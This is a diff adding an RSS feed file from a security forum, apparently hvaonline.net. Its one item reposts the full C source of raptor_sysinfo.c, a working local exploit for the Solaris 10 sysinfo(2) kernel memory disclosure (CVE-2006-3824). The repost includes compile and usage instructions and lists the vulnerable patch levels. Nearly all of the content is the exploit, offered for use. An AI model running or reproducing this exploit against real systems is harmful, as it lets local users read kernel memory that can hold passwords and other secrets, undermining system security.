@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Solaris 10 sysinfo(2) Local Kernel Memory Disclosure Exploit"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Solaris 10 sysinfo(2) Local Kernel Memory Disclosure Exploit"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Solaris 10 sysinfo(2) Local Kernel Memory Disclosure Exploit</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#91;b&#93;Solaris 10 sysinfo&#40;2&#41; Local Kernel Memory Disclosure Exploit&#91;/b&#93;
+<span class="link"> _http://milw0rm.com/exploits/2241</span>
+
+/*
+ * $Id: raptor_sysinfo.c,v 1.2 2006/08/22 13:47:54 raptor Exp $
+ *
+ * raptor_sysinfo.c - Solaris sysinfo&#40;2&#41; kernel memory leak
+ * Copyright &#40;c&#41; 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
+ *
+ * systeminfo.c for Sun Solaris allows local users to read kernel memory via 
+ * a 0 variable count argument to the sysinfo system call, which causes a -1 
+ * argument to be used by the copyout function. NOTE: this issue has been 
+ * referred to as an integer overflow, but it is probably more like a 
+ * signedness error or integer underflow &#40;CVE-2006-3824&#41;.
+ *
+ *<span class="link"> http://en.wikipedia.org/wiki/Pitagora_Suicchi</span>
+ *
+ * Greets to prdelka, who also exploited this vulnerability.
+ *
+ * I should also definitely investigate the old sysinfo&#40;2&#41; vulnerability 
+ * described in CVE-2003-1062, affecting Solaris/SPARC 2.6 through 9 and 
+ * Solaris/x86 2.6 through 8... It may come in handy sooner or later;&#41;
+ *
+ * Usage:
+ * $ gcc raptor_sysinfo.c -o raptor_sysinfo -Wall
+ * $ ./raptor_sysinfo kerndump 666666
+ * &#91;...&#93;
+ * $ ls -l kerndump 
+ * -rwx------   1 raptor   other     666666 Aug 22 14:41 kerndump
+ *
+ * Vulnerable platforms &#40;SPARC&#41;:
+ * Solaris 10 without patch 118833-09 &#91;tested&#93;
+ *
+ * Vulnerable platforms &#40;x86&#41;:
+ * Solaris 10 without patch 118855-06 &#91;untested&#93;
+ */
+
+#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/systeminfo.h&gt;
+
+#define	INFO1	"raptor_sysinfo.c - Solaris sysinfo&#40;2&#41; kernel memory leak"
+#define	INFO2	"Copyright &#40;c&#41; 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;"
+
+#define BUFSIZE 536870911
+
+int 	errno;
+
+int main&#40;int argc, char **argv&#41;
+{
+	int 	fd;
+	size_t	out, bufsize = BUFSIZE;
+	char	*buf;
+
+	/* print exploit information */
+	fprintf&#40;stderr, "%s\n%s\n\n", INFO1, INFO2&#41;;
+
+	/* read command line */
+	if &#40;argc &lt; 2&#41; {
+		fprintf&#40;stderr, "usage: %s outfile &#91;outsize&#93;\n\n", argv&#91;0&#93;&#41;;
+		exit&#40;1&#41;;
+	}
+	if &#40;argc &gt; 2&#41;
+		if &#40;&#40;bufsize = atoi&#40;argv&#91;2&#93;&#41;&#41; == 0&#41; {
+			fprintf&#40;stderr, "Error &#40;atoi&#41;: invalid outsize\n"&#41;;
+			exit&#40;1&#41;;
+		}
+
+	/* print some output */
+	fprintf&#40;stderr, "Using outfile\t: %s\n", argv&#91;1&#93;&#41;;
+	fprintf&#40;stderr, "Using outsize\t: %u\n\n", bufsize&#41;;
+
+	/* prepare the output buffer */
+	if &#40;&#40;buf = &#40;char *&#41;malloc&#40;bufsize&#41;&#41; == NULL&#41; {
+		perror&#40;"Error &#40;malloc&#41;"&#41;;
+		fprintf&#40;stderr, "Hint: Try again with a smaller output size\n"&#41;;
+		exit&#40;1&#41;;
+	}
+	memset&#40;buf, 0, bufsize&#41;;
+
+	/* Pitagora Suicchi! */
+	sysinfo&#40;SI_SYSNAME, buf, 0&#41;;
+
+	/* save output to outfile */
+	if &#40;&#40;fd = open&#40;argv&#91;1&#93;, O_RDWR | O_CREAT | O_TRUNC, 0700&#41;&#41; &lt; 0&#41; {
+		perror&#40;"Error &#40;open&#41;"&#41;;
+		free&#40;buf&#41;;
+		exit&#40;1&#41;;
+	}
+	out = write&#40;fd, buf, bufsize&#41;;
+	fprintf&#40;stderr, "Pitagora Suicchi! %u bytes written to %s\n", out, argv&#91;1&#93;&#41;;
+	fprintf&#40;stderr, "Hint: Try also with a bigger output size\n"&#41;;
+
+	close&#40;fd&#41;;
+	free&#40;buf&#41;;
+
+	exit&#40;0&#41;;
+}</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3080.hva#17285</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/3080.hva#17285</link>
+				<pubDate><![CDATA[Wed, 23 Aug 2006 10:38:17]]> GMT</pubDate>
+				<author><![CDATA[ DaoDuyHieu]]></author>
+			</item>
+	</channel>
+</rss>
